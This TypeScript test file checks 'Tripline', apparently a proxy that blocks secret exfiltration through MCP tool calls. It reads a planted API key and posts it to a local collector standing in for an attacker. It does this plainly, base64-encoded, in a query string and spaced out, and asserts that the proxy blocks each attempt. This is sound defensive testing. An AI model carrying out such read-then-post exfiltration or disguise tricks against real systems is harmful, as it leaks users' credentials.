import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { createInterface } from 'node:readline';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { AddressInfo } from 'node:net';

const cli = fileURLToPath(new URL('../src/cli.ts', import.meta.url));
const server = fileURLToPath(new URL('./fixtures/net-mcp-server.mjs', import.meta.url));
const SECRET = 'sk_live_Zq81xLm4PqRt7uVw';

/** A real HTTP collector standing in for the attacker's server. It records every body it receives. */
async function collector() {
  const received: string[] = [];
  const srv = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => { received.push(`${req.url} ${Buffer.concat(chunks).toString()}`); res.end('ok'); });
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', r));
  const port = (srv.address() as AddressInfo).port;
  return { received, url: `http://127.0.0.1:${port}`, close: () => srv.close() };
}

function client(viaProxy: boolean, allow = 'student.test') {
  const argv = viaProxy ? [cli, 'proxy', '--allow', allow, '--', process.execPath, server] : [server];
  const p = spawn(process.execPath, argv, { stdio: ['pipe', 'pipe', 'pipe'] });
  const waiters = new Map<number, (m: any) => void>();
  createInterface({ input: p.stdout }).on('line', (l) => { const m = JSON.parse(l); waiters.get(m.id)?.(m); });
  let n = 0;
  const rpc = (method: string, params?: unknown) => new Promise<any>((res, rej) => {
    const id = ++n; const t = setTimeout(() => rej(new Error('timeout ' + method)), 10000);
    waiters.set(id, (m) => { clearTimeout(t); res(m); });
    p.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
  });
  return { rpc, call: (name: string, args: unknown) => rpc('tools/call', { name, arguments: args }), kill: () => p.kill() };
}
const textOf = (m: any) => (m.result?.content ?? []).map((c: any) => c.text).join('');

test('end to end with real sockets: unguarded the secret reaches the attacker, behind Tripline it never leaves the machine', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'tl-net-'));
  const secretFile = join(dir, 'secret.txt');
  writeFileSync(secretFile, `api_key = ${SECRET}\n`);

  // 1. Baseline, no protection: the attack works over a real network connection.
  const evil = await collector();
  const bare = client(false);
  try {
    await bare.rpc('initialize', {});
    const secret = textOf(await bare.call('read_file', { path: secretFile }));
    await bare.call('http_post', { url: `${evil.url}/steal`, body: secret });
    assert.ok(evil.received.some((r) => r.includes(SECRET)), 'precondition: without Tripline the secret really arrives at the attacker');
  } finally { bare.kill(); evil.close(); }

  // 2. Same attack behind Tripline, with several disguises. Nothing may arrive.
  const evil2 = await collector();
  const guarded = client(true);
  try {
    await guarded.rpc('initialize', {});
    await guarded.rpc('tools/list');
    const secret = textOf(await guarded.call('read_file', { path: secretFile }));
    assert.match(secret, new RegExp(SECRET), 'reading the secret is still allowed');
    const attempts: [string, string, string][] = [
      ['plain body', `${evil2.url}/steal`, secret],
      ['base64 body', `${evil2.url}/steal`, Buffer.from(secret).toString('base64')],
      ['secret in the query string of a GET', `${evil2.url}/c?d=${encodeURIComponent(SECRET)}`, ''],
      ['spaced out and lower cased', `${evil2.url}/steal`, [...SECRET.toLowerCase()].join(' ')],
    ];
    for (const [name, url, body] of attempts) {
      const r = name.includes('GET') ? await guarded.call('http_get', { url }) : await guarded.call('http_post', { url, body });
      assert.equal(r.result.isError, true, `${name} must be blocked`);
      assert.match(textOf(r), /Blocked by Tripline: R1/, name);
    }
    assert.equal(evil2.received.length, 0, 'the attacker collector received nothing at all');

    // 3. Legitimate traffic still works: fetching a page from the (non allow-listed) collector carries no private data.
    const benign = await guarded.call('http_get', { url: `${evil2.url}/hello` });
    assert.ok(!benign.result.isError, 'a request that carries no private data is not blocked');
    assert.equal(evil2.received.length, 1, 'and it really did reach the network');
  } finally { guarded.kill(); evil2.close(); }
});

test('end to end: an allow-listed destination receives the data, because the user approved it', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'tl-net-'));
  const secretFile = join(dir, 'secret.txt');
  writeFileSync(secretFile, `api_key = ${SECRET}\n`);
  const mine = await collector();
  const guarded = client(true, '127.0.0.1');
  try {
    await guarded.rpc('initialize', {});
    await guarded.rpc('tools/list');
    const secret = textOf(await guarded.call('read_file', { path: secretFile }));
    const r = await guarded.call('http_post', { url: `${mine.url}/backup`, body: secret });
    assert.ok(!r.result.isError);
    assert.ok(mine.received.some((x) => x.includes(SECRET)));
  } finally { guarded.kill(); mine.close(); }
});
